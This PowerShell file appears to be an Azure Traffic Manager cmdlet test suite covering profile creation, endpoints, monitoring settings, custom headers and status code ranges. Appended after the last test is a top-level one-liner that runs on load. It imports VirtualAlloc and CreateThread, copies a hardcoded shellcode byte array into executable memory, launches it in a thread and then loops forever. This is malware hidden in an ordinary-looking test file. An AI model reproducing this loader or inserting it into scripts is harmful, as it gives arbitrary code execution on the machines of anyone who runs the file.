














function Test-ProfileCrud
{
	$profileName = getAssetName
	$resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName

	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -ProfileStatus "Enabled" -Tags @{ ProfileTagA="firstProfileTag"; ProfileTagB="SecondProfileTag" }
	Assert-NotNull $createdProfile
	Assert-AreEqual $profileName $createdProfile.Name 
	Assert-AreEqual $resourceGroup.ResourceGroupName $createdProfile.ResourceGroupName 
	Assert-AreEqual "Performance" $createdProfile.TrafficRoutingMethod

	$createdProfile = Add-AzTrafficManagerEndpointConfig -EndpointName "MyExternalEndpoint" -TrafficManagerProfile $createdProfile -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe"
	$createdProfile = Set-AzTrafficManagerProfile -TrafficManagerProfile $createdProfile

	$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName
	Assert-AreEqual "MyExternalEndpoint" $retrievedProfile.Endpoints[0].Name

	Assert-NotNull $retrievedProfile
	Assert-AreEqual $profileName $retrievedProfile.Name 
	Assert-AreEqual $resourceGroup.ResourceGroupName $retrievedProfile.ResourceGroupName
	Assert-AreEqual 2 $retrievedProfile.Tags.Count

	$createdProfile.TrafficRoutingMethod = "Priority"

	$updatedProfile = Set-AzTrafficManagerProfile -TrafficManagerProfile $createdProfile

	Assert-NotNull $updatedProfile
	Assert-AreEqual $profileName $updatedProfile.Name 
	Assert-AreEqual $resourceGroup.ResourceGroupName $updatedProfile.ResourceGroupName
	Assert-AreEqual "Priority" $updatedProfile.TrafficRoutingMethod

	$removed = Remove-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Force

	Assert-True { $removed }

	Assert-Throws { Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName }
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileCrudWithPiping
{
	$profileName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName
	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -ProfileStatus "Enabled"

	$createdProfile.TrafficRoutingMethod = "Priority"

	$removed = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName | Set-AzTrafficManagerProfile | Remove-AzTrafficManagerProfile -Force

	Assert-True { $removed }

	Assert-Throws { Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName } 
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-CreateDeleteUsingProfile
{
	$profileName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName
	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -ProfileStatus "Enabled"

	Assert-NotNull $createdProfile
	Assert-AreEqual $profileName $createdProfile.Name 
	Assert-AreEqual $resourceGroup.ResourceGroupName $createdProfile.ResourceGroupName 
	Assert-AreEqual "Performance" $createdProfile.TrafficRoutingMethod

	Remove-AzTrafficManagerProfile -TrafficManagerProfile $createdProfile -Force

	Assert-Throws { Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName } 
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-CrudWithEndpoint
{
	$profileName = getAssetName
	$resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName
	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -ProfileStatus "Enabled"

	$createdEndpoint = New-AzTrafficManagerEndpoint -Name "MyExternalEndpoint" -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" -EndpointLocation "North Europe"

	$updatedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName
	
	Assert-AreEqual 1 $updatedProfile.Endpoints.Count
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-CrudWithEndpointGeo
{
	$profileName = getAssetName
	$resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName
	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Geographic" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -ProfileStatus "Enabled"

	$createdEndpoint = New-AzTrafficManagerEndpoint -Name "MyExternalEndpoint" -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -GeoMapping "RE","RO","RU","RW" -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Enabled" 

	$updatedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

	Assert-AreEqual 1 $updatedProfile.Endpoints.Count

	$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

	Assert-AreEqual "Geographic" $retrievedProfile.TrafficRoutingMethod
	Assert-AreEqual 1 $retrievedProfile.Endpoints.Count
	Assert-AreEqual 4 $retrievedProfile.Endpoints[0].GeoMapping.Count
	Assert-AreEqual "RE" $retrievedProfile.Endpoints[0].GeoMapping[0]
	Assert-AreEqual "RO" $retrievedProfile.Endpoints[0].GeoMapping[1]
	Assert-AreEqual "RU" $retrievedProfile.Endpoints[0].GeoMapping[2]
	Assert-AreEqual "RW" $retrievedProfile.Endpoints[0].GeoMapping[3]
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ListProfilesInResourceGroup
{
	$profileName = getAssetName
	$resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName
	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -ProfileStatus "Enabled"

	$profiles = Get-AzTrafficManagerProfile -ResourceGroupName $resourceGroup.ResourceGroupName

	Assert-AreEqual 1 $profiles.Count
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ListProfilesInSubscription
{
	$profileName = getAssetName
	$resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName
	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -ProfileStatus "Enabled"

	$profiles = Get-AzTrafficManagerProfile

	Assert-NotNull $profiles
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ListProfilesWhereObject
{
	$resourceGroup = TestSetup-CreateResourceGroup

	$profileName1 = getAssetName
	$relativeName1 = getAssetName
	$profileName2 = getAssetName
	$relativeName2 = getAssetName
		
	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -Name $profileName1 -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName1 -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -ProfileStatus "Enabled"
	$createdProfile = New-AzTrafficManagerProfile -Name $profileName2 -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName2 -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -ProfileStatus "Enabled"

	$profiles = Get-AzTrafficManagerProfile -ResourceGroupName $resourceGroup.ResourceGroupName
	Assert-AreEqual System.Object[] $profiles.GetType()

	$profile2 = $profiles | where-object {$_.Name -eq $profileName2}

	Assert-AreEqual $profileName2 $profile2.Name
	Assert-AreEqual $relativeName2 $profile2.RelativeDnsName
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileNewAlreadyExists
{
	$resourceGroup = TestSetup-CreateResourceGroup
	$profileName = getAssetName

    
	try
	{
	$createdProfile = TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName
	$resourceGroupName = $createdProfile.ResourceGroupName

	Assert-NotNull $createdProfile
	
	Assert-Throws { TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName } 

	$createdProfile | Remove-AzTrafficManagerProfile -Force
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileRemoveNonExisting
{
	$profileName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup
	
	
	try
	{
	$removed = Remove-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Force 
	Assert-False { $removed }
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileEnable
{
	$profileName = getAssetName
	$relativeName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup
	
	
	try
	{
	$disabledProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -ProfileStatus "Disabled" -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp"
	Assert-AreEqual "Disabled" $disabledProfile.ProfileStatus

    Assert-True { Enable-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName }

    $updatedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

    Assert-AreEqual "Enabled" $updatedProfile.ProfileStatus
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileEnablePipeline
{
	$profileName = getAssetName
	$relativeName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup
	
	
	try
	{
	$disabledProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -ProfileStatus "Disabled" -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp"
	Assert-AreEqual "Disabled" $disabledProfile.ProfileStatus

    Assert-True { Enable-AzTrafficManagerProfile -TrafficManagerProfile $disabledProfile }

    $updatedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

    Assert-AreEqual "Enabled" $updatedProfile.ProfileStatus
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileEnableNonExisting
{
	$profileName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup

    
	try
	{
	Assert-Throws { Enable-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName } 
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileDisable
{
	$profileName = getAssetName
	$relativeName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup
	
	
	try
	{
	$enabledProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -ProfileStatus "Enabled" -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" 
	
	Assert-AreEqual "Enabled" $enabledProfile.ProfileStatus

    Assert-True { Disable-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Force }

    $updatedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

    Assert-AreEqual "Disabled" $updatedProfile.ProfileStatus
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileDisablePipeline
{
	$profileName = getAssetName
	$relativeName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup
	
	
	try
	{
	$enabledProfile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -ProfileStatus "Enabled" -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" 
	Assert-AreEqual "Enabled" $enabledProfile.ProfileStatus

    Assert-True { Disable-AzTrafficManagerProfile -TrafficManagerProfile $enabledProfile -Force }

    $updatedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

    Assert-AreEqual "Disabled" $updatedProfile.ProfileStatus
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileDisableNonExisting
{
	$profileName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup

	try
	{
	Assert-Throws { Disable-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Force } 
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileMonitorDefaults
{
	$profileName = getAssetName
	$resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName
	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -Ttl 30 -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -TrafficRoutingMethod "Weighted" -ProfileStatus "Enabled"

	Assert-NotNull $createdProfile
	Assert-AreEqual 30 $createdProfile.MonitorIntervalInSeconds 
	Assert-AreEqual 10 $createdProfile.MonitorTimeoutInSeconds 
	Assert-AreEqual 3 $createdProfile.MonitorToleratedNumberOfFailures

	$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

	Assert-NotNull $retrievedProfile
	Assert-AreEqual 30 $retrievedProfile.MonitorIntervalInSeconds 
	Assert-AreEqual 10 $retrievedProfile.MonitorTimeoutInSeconds 
	Assert-AreEqual 3 $retrievedProfile.MonitorToleratedNumberOfFailures

	Remove-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Force
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileMonitorCustom
{
	$profileName = getAssetName
	$resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName
	
	try
	{
	$createdProfile = New-AzTrafficManagerProfile -MonitorIntervalInSeconds 10 -MonitorTimeoutInSeconds 7 -MonitorToleratedNumberOfFailures 1 -Ttl 0 -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp" -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -TrafficRoutingMethod "Weighted" -ProfileStatus "Enabled"

	Assert-NotNull $createdProfile
	Assert-AreEqual 10 $createdProfile.MonitorIntervalInSeconds 
	Assert-AreEqual 7 $createdProfile.MonitorTimeoutInSeconds 
	Assert-AreEqual 1 $createdProfile.MonitorToleratedNumberOfFailures
	Assert-AreEqual 0 $createdProfile.Ttl

	$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

	Assert-NotNull $retrievedProfile
	Assert-AreEqual 10 $retrievedProfile.MonitorIntervalInSeconds 
	Assert-AreEqual 7 $retrievedProfile.MonitorTimeoutInSeconds 
	Assert-AreEqual 1 $retrievedProfile.MonitorToleratedNumberOfFailures
	Assert-AreEqual 0 $retrievedProfile.Ttl 

    $retrievedProfile.MonitorIntervalInSeconds = 30
	$retrievedProfile.MonitorTimeoutInSeconds = 8
	$retrievedProfile.MonitorToleratedNumberOfFailures = 0
	$retrievedProfile.Ttl = 5

	$updatedProfile = Set-AzTrafficManagerProfile -TrafficManagerProfile $retrievedProfile

	Assert-NotNull $updatedProfile
	Assert-AreEqual 30 $updatedProfile.MonitorIntervalInSeconds 
	Assert-AreEqual 8 $updatedProfile.MonitorTimeoutInSeconds 
	Assert-AreEqual 0 $updatedProfile.MonitorToleratedNumberOfFailures
	Assert-AreEqual 5 $updatedProfile.Ttl 

	Remove-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Force
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileMonitorProtocol
{
	$profileName = getAssetName
	$resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName

	try
	{
	$createdProfile = New-AzTrafficManagerProfile -MonitorProtocol "TCP" -MonitorPort 8080 -Ttl 50 -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -TrafficRoutingMethod "Weighted" -ProfileStatus "Enabled"

	Assert-NotNull $createdProfile
	Assert-AreEqual "TCP" $createdProfile.MonitorProtocol 
	Assert-AreEqual 8080 $createdProfile.MonitorPort 
	Assert-Null $createdProfile.MonitorPath

	$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

	Assert-NotNull $retrievedProfile
	Assert-AreEqual "TCP" $retrievedProfile.MonitorProtocol 
	Assert-AreEqual 8080 $retrievedProfile.MonitorPort 
	Assert-Null $retrievedProfile.MonitorPath

    $retrievedProfile.MonitorPort = 81
	$retrievedProfile.MonitorProtocol = "HTTP"
	$retrievedProfile.MonitorPath = "/health.htm"

	$updatedProfile = Set-AzTrafficManagerProfile -TrafficManagerProfile $retrievedProfile

	Assert-NotNull $updatedProfile
	Assert-AreEqual "HTTP" $updatedProfile.MonitorProtocol 
	Assert-AreEqual 81 $updatedProfile.MonitorPort 
	Assert-AreEqual "/health.htm" $retrievedProfile.MonitorPath

    $updatedProfile.MonitorPort = 8086
	$updatedProfile.MonitorProtocol = "TCP"
	$updatedProfile.MonitorPath = $null

	$revertedProfile = Set-AzTrafficManagerProfile -TrafficManagerProfile $updatedProfile

	Assert-NotNull $revertedProfile
	Assert-AreEqual "TCP" $revertedProfile.MonitorProtocol 
	Assert-AreEqual 8086 $revertedProfile.MonitorPort 

	Assert-True { Remove-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Force }
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-ProfileMonitorParameterAliases
{
	$profileName = getAssetName
	$resourceGroup = TestSetup-CreateResourceGroup
	$relativeName = getAssetName
	
	try
	{
		$createdProfile = New-AzTrafficManagerProfile -ProtocolForMonitor "HTTPS" -PortForMonitor 85 -PathForMonitor "/test" -IntervalInSecondsForMonitor 10 -TimeoutInSecondsForMonitor 9 -ToleratedNumberOfFailuresForMonitor 5 -Ttl 1 -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -RelativeDnsName $relativeName -TrafficRoutingMethod "Weighted" -ProfileStatus "Enabled"

		Assert-NotNull $createdProfile
		Assert-AreEqual "HTTPS" $createdProfile.MonitorProtocol
		Assert-AreEqual "85" $createdProfile.MonitorPort
		Assert-AreEqual "/test" $createdProfile.MonitorPath
		Assert-AreEqual 10 $createdProfile.MonitorIntervalInSeconds 
		Assert-AreEqual 9 $createdProfile.MonitorTimeoutInSeconds 
		Assert-AreEqual 5 $createdProfile.MonitorToleratedNumberOfFailures
		Assert-AreEqual 1 $createdProfile.Ttl

		$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

		Assert-NotNull $retrievedProfile
		Assert-AreEqual "HTTPS" $retrievedProfile.MonitorProtocol
		Assert-AreEqual "85" $retrievedProfile.MonitorPort
		Assert-AreEqual "/test" $retrievedProfile.MonitorPath
		Assert-AreEqual 10 $retrievedProfile.MonitorIntervalInSeconds 
		Assert-AreEqual 9 $retrievedProfile.MonitorTimeoutInSeconds 
		Assert-AreEqual 5 $retrievedProfile.MonitorToleratedNumberOfFailures
		Assert-AreEqual 1 $retrievedProfile.Ttl
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-AddAndRemoveCustomHeadersFromProfile
{
	$profileName = getAssetName
	$relativeName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup
	
	try
	{
	$profile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -ProfileStatus "Disabled" -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp"

    $retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

	Add-AzTrafficManagerCustomHeaderToProfile -Name "profileHeaderNameA" -Value "profileHeaderValueA" -TrafficManagerProfile $profile
	Add-AzTrafficManagerCustomHeaderToProfile -Name "profileHeaderNameB" -Value "profileHeaderValueB" -TrafficManagerProfile $profile
	Set-AzTrafficManagerProfile -TrafficManagerProfile $profile
	$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

    Assert-AreEqual 2 $retrievedProfile.CustomHeaders.Count
	Assert-AreEqual "profileHeaderNameA" $retrievedProfile.CustomHeaders[0].Name
	Assert-AreEqual "profileHeaderValueA" $retrievedProfile.CustomHeaders[0].Value
	Assert-AreEqual "profileHeaderNameB" $retrievedProfile.CustomHeaders[1].Name
	Assert-AreEqual "profileHeaderValueB" $retrievedProfile.CustomHeaders[1].Value

	Assert-True { Remove-AzTrafficManagerCustomHeaderFromProfile -Name "profileHeaderNameB"  -TrafficManagerProfile $retrievedProfile }
	Set-AzTrafficManagerProfile -TrafficManagerProfile $retrievedProfile
	$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

    Assert-AreEqual 1 $retrievedProfile.CustomHeaders.Count
	Assert-AreEqual "profileHeaderNameA" $retrievedProfile.CustomHeaders[0].Name
	Assert-AreEqual "profileHeaderValueA" $retrievedProfile.CustomHeaders[0].Value
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}


function Test-AddAndRemoveExpectedStatusCodeRanges
{
	$profileName = getAssetName
	$relativeName = getAssetName
    $resourceGroup = TestSetup-CreateResourceGroup
	
	try
	{
	$profile = New-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -ProfileStatus "Disabled" -RelativeDnsName $relativeName -Ttl 50 -TrafficRoutingMethod "Performance" -MonitorProtocol "HTTP" -MonitorPort 80 -MonitorPath "/testpath.asp"

    $retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

	Add-AzTrafficManagerExpectedStatusCodeRange -Min 200 -Max 499 -TrafficManagerProfile $profile
	Add-AzTrafficManagerExpectedStatusCodeRange -Min 502 -Max 502 -TrafficManagerProfile $profile
	Set-AzTrafficManagerProfile -TrafficManagerProfile $profile
	$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

    Assert-AreEqual 2 $retrievedProfile.ExpectedStatusCodeRanges.Count
	Assert-AreEqual 200 $retrievedProfile.ExpectedStatusCodeRanges[0].Min
	Assert-AreEqual 499 $retrievedProfile.ExpectedStatusCodeRanges[0].Max
	Assert-AreEqual 502 $retrievedProfile.ExpectedStatusCodeRanges[1].Min
	Assert-AreEqual 502 $retrievedProfile.ExpectedStatusCodeRanges[1].Max

	Assert-True { Remove-AzTrafficManagerExpectedStatusCodeRange -Min 200  -TrafficManagerProfile $retrievedProfile }
	Set-AzTrafficManagerProfile -TrafficManagerProfile $retrievedProfile
	$retrievedProfile = Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName

    Assert-AreEqual 1 $retrievedProfile.ExpectedStatusCodeRanges.Count
	Assert-AreEqual 502 $retrievedProfile.ExpectedStatusCodeRanges[0].Min
	Assert-AreEqual 502 $retrievedProfile.ExpectedStatusCodeRanges[0].Max
	}
    finally
    {
        
        TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xb6,0xc8,0x5e,0x5f,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0xb9,0x2a,0xab,0xa3,0x2d,0x28,0x54,0x5c,0xad,0x4d,0xdc,0xb9,0x9c,0x4d,0xba,0xca,0x8e,0x7d,0xc8,0x9f,0x22,0xf5,0x9c,0x0b,0xb1,0x7b,0x09,0x3b,0x72,0x31,0x6f,0x72,0x83,0x6a,0x53,0x15,0x07,0x71,0x80,0xf5,0x36,0xba,0xd5,0xf4,0x7f,0xa7,0x14,0xa4,0x28,0xa3,0x8b,0x59,0x5d,0xf9,0x17,0xd1,0x2d,0xef,0x1f,0x06,0xe5,0x0e,0x31,0x99,0x7e,0x49,0x91,0x1b,0x53,0xe1,0x98,0x03,0xb0,0xcc,0x53,0xbf,0x02,0xba,0x65,0x69,0x5b,0x43,0xc9,0x54,0x54,0xb6,0x13,0x90,0x52,0x29,0x66,0xe8,0xa1,0xd4,0x71,0x2f,0xd8,0x02,0xf7,0xb4,0x7a,0xc0,0xaf,0x10,0x7b,0x05,0x29,0xd2,0x77,0xe2,0x3d,0xbc,0x9b,0xf5,0x92,0xb6,0xa7,0x7e,0x15,0x19,0x2e,0xc4,0x32,0xbd,0x6b,0x9e,0x5b,0xe4,0xd1,0x71,0x63,0xf6,0xba,0x2e,0xc1,0x7c,0x56,0x3a,0x78,0xdf,0x3e,0x8f,0xb1,0xe0,0xbe,0x87,0xc2,0x93,0x8c,0x08,0x79,0x3c,0xbc,0xc1,0xa7,0xbb,0xc3,0xfb,0x10,0x53,0x3a,0x04,0x61,0x7d,0xf8,0x50,0x31,0x15,0x29,0xd9,0xda,0xe5,0xd6,0x0c,0x76,0xe3,0x40,0x6f,0x2f,0xea,0x94,0x07,0x32,0xed,0xa4,0xee,0xbb,0x0b,0x94,0x40,0xec,0x83,0x54,0x31,0x4c,0x74,0x3c,0x5b,0x43,0xab,0x5c,0x64,0x89,0xc4,0xf6,0x8b,0x64,0xbc,0x6e,0x35,0x2d,0x36,0x0f,0xba,0xfb,0x32,0x0f,0x30,0x08,0xc2,0xc1,0xb1,0x65,0xd0,0xb5,0x31,0x30,0x8a,0x13,0x4d,0xee,0xa1,0x9b,0xdb,0x15,0x60,0xcc,0x73,0x14,0x55,0x3a,0xdc,0xe7,0xb0,0x31,0xd5,0x7d,0x7b,0x2d,0x1a,0x92,0x7b,0xad,0x4c,0xf8,0x7b,0xc5,0x28,0x58,0x28,0xf0,0x36,0x75,0x5c,0xa9,0xa2,0x76,0x35,0x1e,0x64,0x1f,0xbb,0x79,0x42,0x80,0x44,0xac,0x52,0xfc,0x92,0x88,0x20,0xec,0x26;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

